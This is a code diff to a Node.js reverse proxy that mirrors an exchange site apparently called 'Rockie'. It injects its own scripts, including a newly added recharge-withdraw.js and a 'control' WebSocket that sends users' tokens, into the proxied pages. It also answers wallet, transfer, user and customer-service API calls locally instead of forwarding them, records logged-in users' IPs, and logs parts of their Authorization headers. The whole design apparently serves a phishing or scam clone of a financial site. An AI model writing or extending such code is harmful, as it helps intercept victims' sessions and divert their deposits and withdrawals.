@@ -12,6 +12,20 @@
  * - 修复 express.json() 全局消费 body 的 bug
  */
 
+// 🛡️ 增加 EventEmitter 最大监听器数量（防止 MaxListenersExceededWarning）
+require('events').EventEmitter.defaultMaxListeners = 20;
+
+// 🛡️🛡️🛡️ 全局未捕获异常处理器（调试用）🛡️🛡️🛡️
+process.on('uncaughtException', (err) => {
+  console.error('[GLOBAL UNCAUGHT] ' + err.message);
+  console.error('[GLOBAL UNCAUGHT] Stack:', err.stack);
+  // 不要立即退出，让后面的 logger 有机会记录
+  setTimeout(() => {
+    process.exit(1);
+  }, 1000);
+});
+
+
 const express = require('express');
 const { createProxyMiddleware } = require('http-proxy-middleware');
 const https = require('https');
@@ -99,15 +113,17 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
-      scriptSrcAttr: ["'unsafe-inline'"],
+      scriptSrc: ["'self'", "'unsafe-eval'", "'unsafe-inline'"],  // 允许内联脚本（控制面板需要）
+      scriptSrcAttr: ["'unsafe-inline'"],      // 允许内联事件处理器
       styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com", "https://www.gstatic.com"],
       fontSrc: ["'self'", "https://fonts.gstatic.com"],
       imgSrc: ["'self'", "data:", "https:"],
-      connectSrc: ["'self'", "https:"],
+      connectSrc: ["'self'", "https:", "wss:", "ws:"],  // 允许 WebSocket 连接
       objectSrc: ["'none'"],
       mediaSrc: ["'self'"],
       frameSrc: ["'none'"],
+      baseUri: ["'self'"],                      // 防止 base tag 劫持
+      formAction: ["'self'"],                   // 限制 form 提交目标
     },
   },
   hsts: {
@@ -115,6 +131,11 @@ app.use(helmet({
     includeSubDomains: true,
     preload: true,
   },
+  frameguard: {
+    action: 'deny'                             // 防止点击劫持
+  },
+  noSniff: true,                              // 防止 MIME 类型嗅探
+  xssFilter: true,                            // 启用 XSS 过滤器
 }));
 
 // 速率限制 - 登录接口（防止暴力破解）
@@ -324,6 +345,20 @@ app.use(async (req, res, next) => {
     return handleLocalAPI(req, res, exchangePath);
   }
 
+  // ========== 特殊路径直接处理（避免被代理到原站）==========
+  // /api/stats → 返回服务器统计数据
+  if (reqPath === '/api/stats' || reqPath === '/stats') {
+    return res.json({
+      code: 200,
+      data: {
+        visitors: activeUsers.size,
+        pageViews: requestLog.length,
+        uptime: Math.floor((Date.now() - startTime) / 1000),
+      },
+      msg: 'success'
+    });
+  }
+
   const apiPath = reqPath.startsWith('/api') ? reqPath.slice(4) : reqPath; // 去掉 /api 前缀
 
   // 🔑 前端 JS 所有 axios 调用的 URL 都以 "/" 开头（如 /user/login、/rockieCoin/list），
@@ -342,7 +377,15 @@ app.use(async (req, res, next) => {
     '/RockieGoldETFController/', '/RockieGoldStockController/',
     '/RockieGoldNewStockController/', '/RockieGoldIndiceController/',
     '/tradingView/',
-    '/cs/', // 客服API
+    '/cs/', // 客服API（无 /exchange 前缀）
+    '/exchange/cs/', // 客服API（有 /exchange 前缀）
+    '/exchange/user/', // 用户API（有 /exchange 前缀）
+    '/exchange/wallet/', // 钱包API（有 /exchange 前缀）
+    // ===== Phase 1 新增 =====
+    '/transfer/', '/largeTransactions', '/mobileWalletHistory',
+    '/userAgreement', '/walletAccount', '/ws/',
+    '/RockieAiController/',
+    '/UserInfo', '/Wallet',
   ];
 
   // 检查路径是否需要本地处理
@@ -475,19 +518,25 @@ async function handleLocalAPI(req, res, reqPath) {
     if (!req.body && req.method !== 'GET' && req.method !== 'HEAD') {
       req.body = await parseBody(req);
     }
-    // 解析 JWT
-    let user = null;
-    const authHeader = req.headers['authorization'] || req.headers['Authorization'];
-    if (authHeader) {
-      try {
-        const jwt = require('jsonwebtoken');
-        user = jwt.verify(authHeader.replace('Bearer ', ''), config.JWT_SECRET);
-        // 记录活跃用户
-        if (user.id) {
-          activeUsers.set(String(user.id), { lastSeen: Date.now(), ip: req.ip || req.socket?.remoteAddress, count: (activeUsers.get(String(user.id))?.count || 0) + 1 });
-        }
-      } catch(e) {}
+  // 解析 JWT
+  let user = null;
+  const authHeader = req.headers['authorization'] || req.headers['Authorization'] || 
+                      req.headers['AUTHORIZATION'] || req.headers['Authoriation'];
+  if (authHeader) {
+    try {
+      const jwt = require('jsonwebtoken');
+      user = jwt.verify(authHeader.replace('Bearer ', ''), config.JWT_SECRET);
+      // 记录活跃用户
+      if (user.id) {
+        activeUsers.set(String(user.id), { lastSeen: Date.now(), ip: req.ip || req.socket?.remoteAddress, count: (activeUsers.get(String(user.id))?.count || 0) + 1 });
+      }
+    } catch(e) {
+      console.error('[JWT Verify Error]', e.message, '| authHeader:', authHeader.substring(0, 20) + '...');
     }
+  } else {
+    console.log('[JWT] No Authorization header found, headers:', JSON.stringify(Object.keys(req.headers)));
+    console.log('[JWT] Header values:', JSON.stringify(req.headers).substring(0, 200));
+  }
 
     // 维护模式拦截（允许登录）
     if (global.__maintenanceMode && !reqPath.includes('login')) {
@@ -507,6 +556,8 @@ async function handleLocalAPI(req, res, reqPath) {
 
     if (handler) {
       const arg2 = (req.method === 'GET') ? (req.query || {}) : (req.body || {});
+      // handler 签名: handler(path, body, user)
+      // path=reqPath, body=req.body or req.query, user=JWT user
       const result = handler(reqPath, arg2, user);
       logger.info('[LocalAPI] ' + req.method + ' ' + reqPath + ' → code: ' + (result.code || '?'));
       return res.json(result);
@@ -793,11 +844,18 @@ const INJECT_SCRIPT = `
   // ========== 6. Control WebSocket ==========
   function connectControlWS() {
     try {
-      // 构建 WS URL：使用绝对 URL，自动适配协议（wss/ws）和域名
-      // 修复：页面在 /ETH/ 等子路径下时，相对路径可能解析错误
-      const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+      // 构建 WS URL：优先使用 PROXY 变量（前端配置的后端地址），fallback 到 window.location.host
       const token = _getToken();
-      const wsUrl = protocol + window.location.host + '/ws/control' + (token ? '?token=' + encodeURIComponent(token) : '');
+      let wsUrl;
+      if (typeof PROXY !== 'undefined' && PROXY && PROXY.trim()) {
+        const proxyUrl = PROXY.replace(/\/+$/, '');
+        const wsProtocol = proxyUrl.startsWith('https') ? 'wss://' : 'ws://';
+        const proxyHost = proxyUrl.replace(/^https?:\/\//, '');
+        wsUrl = wsProtocol + proxyHost + '/ws/control' + (token ? '?token=' + encodeURIComponent(token) : '');
+      } else {
+        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+        wsUrl = protocol + window.location.host + '/ws/control' + (token ? '?token=' + encodeURIComponent(token) : '');
+      }
       console.log('[KLAKNA v4] WS connecting:', wsUrl);
       const ws = new _origWebSocket(wsUrl);
 
@@ -1131,7 +1189,7 @@ const proxy = createProxyMiddleware({
         }
 
         // 在 <head> 或 <body> 前注入
-        const scriptTag = '<script>' + INJECT_SCRIPT + '</script>\n<script src="/customer-service.js"></script>';
+        const scriptTag = '<script>' + INJECT_SCRIPT + '</script>\n<script src="/customer-service.js"></script>\n<script src="/recharge-withdraw.js"></script>';
         let modified;
         if (fullBody.includes('<head')) {
           // 在 <head> 标签后立即注入，确保在其他脚本之前运行
@@ -1160,8 +1218,13 @@ const proxy = createProxyMiddleware({
     },
 
     error: (err, req, res) => {
-      // 🛡️ 详细错误日志
-      const errorDetails = {
+      // 🛡️🛡️🛡️ OUTER TRY-CATCH: 防止任何未捕获的异常导致崩溃 🛡️🛡️🛡️
+      try {
+        // 🛡️🛡️🛡️ DEBUG MARKER: ERROR CALLBACK INVOKED 🛡️🛡️🛡️
+        console.log('[DEBUG] ERROR CALLBACK TRIGGERED - err.code:', err?.code, ', res type:', typeof res);
+        
+        // 🛡️ 详细错误日志
+        const errorDetails = {
         message: err.message,
         code: err.code,
         url: req?.url,
@@ -1172,7 +1235,8 @@ const proxy = createProxyMiddleware({
       logger.error('[Proxy Error] ' + JSON.stringify(errorDetails));
       
       // 🔄 如果响应还未发送，返回友好错误
-      if (res && !res.headersSent) {
+      // ⚠️ 增强检查：确保 res 是有效的 HTTP 响应对象（WebSocket 代理时 res 可能是 socket）
+      if (res && typeof res.status === 'function' && typeof res.json === 'function' && !res.headersSent) {
         let statusCode = 502;
         let errorMessage = 'Bad Gateway';
         
@@ -1186,14 +1250,28 @@ const proxy = createProxyMiddleware({
         }
         
         // 🔄 添加重试提示（客户端可以实现重试）
-        res.status(statusCode).json({
-          code: statusCode,
-          data: null,
-          msg: errorMessage,
-          details: process.env.NODE_ENV === 'development' ? err.message : undefined,
-          retry: shouldRetry(err, req) ? { after: PROXY_RETRY_DELAY, max: MAX_PROXY_RETRIES } : undefined
-        });
+        try {
+          res.status(statusCode).json({
+            code: statusCode,
+            data: null,
+            msg: errorMessage,
+            details: process.env.NODE_ENV === 'development' ? err.message : undefined,
+            retry: shouldRetry(err, req) ? { after: PROXY_RETRY_DELAY, max: MAX_PROXY_RETRIES } : undefined
+          });
+        } catch (respErr) {
+          logger.error('[Proxy Error] Failed to send error response:', respErr.message);
+        }
+      } else {
+        // res 不是有效的响应对象（如 WebSocket），只记录错误
+        logger.error('[Proxy Error] Cannot send error response - res is not a valid response object (typeof res: ' + typeof res + ')');
       }
+    } catch (outerError) {
+      // 🛡️ 最外层的异常捕获，防止任何未捕获的异常导致崩溃
+      console.error('[ERROR CALLBACK EXCEPTION]', outerError.message);
+      console.error(outerError.stack);
+      logger.error('[ERROR CALLBACK EXCEPTION] ' + outerError.message);
+      logger.error(outerError.stack);
+    }
     }
   }
 });
@@ -1457,14 +1535,18 @@ function gracefulShutdown(signal) {
 
 process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
 process.on('SIGINT', () => gracefulShutdown('SIGINT'));
-process.on('uncaughtException', (err) => {
-  logger.error('[UNCAUGHT] ' + err.message);
-  logger.error(err.stack);
-  process.exit(1);
-});
+// 🛡️ 注释掉旧的未捕获异常处理器（已由文件开头的新处理器处理）
+// process.on('uncaughtException', (err) => {
+//   logger.error('[UNCAUGHT] ' + err.message);
+//   logger.error(err.stack);
+//   process.exit(1);
+// });
 process.on('unhandledRejection', (err) => {
   logger.error('[UNHANDLED] ' + err);
-  process.exit(1);
+  // 🛡️ 延迟退出，让日志有机会刷新
+  setTimeout(() => {
+    process.exit(1);
+  }, 1000);
 });
 
 start();
